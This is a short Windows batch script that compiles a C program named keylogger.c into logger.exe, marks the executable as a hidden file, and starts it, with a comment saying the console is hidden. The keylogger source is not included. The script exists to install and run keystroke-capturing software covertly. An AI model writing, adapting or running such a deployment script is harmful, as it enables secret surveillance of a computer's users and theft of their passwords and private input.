:: Compile the C source file
gcc -o logger.exe ../src/keylogger.c
:: Hides the executable file
attrib logger.exe +h
:: Start the program while hiding console
start /d "./" logger.exe